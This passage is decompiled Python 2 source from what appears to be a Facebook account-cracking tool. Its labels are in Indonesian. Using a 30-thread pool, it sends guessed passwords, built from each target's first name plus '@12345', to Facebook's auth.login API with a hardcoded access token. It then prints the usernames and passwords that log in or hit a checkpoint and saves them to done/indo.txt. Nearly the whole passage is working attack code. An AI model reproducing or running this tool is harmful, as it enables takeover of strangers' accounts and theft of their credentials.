                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '@12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def perbarui():
    os.system('clear')
    print logo
    jalan('\x1b[1;92mUpdate Tools...\x1b[1;93m')
    os.system('git pull')
    raw_input('\n\x1b[1;94m[\x1b[1;97m<Back>\x1b[1;94m]')
    menu()


if __name__ == '__main__':
    menu()
    login()
    masuk()
# okay decompiling cfb.pyc
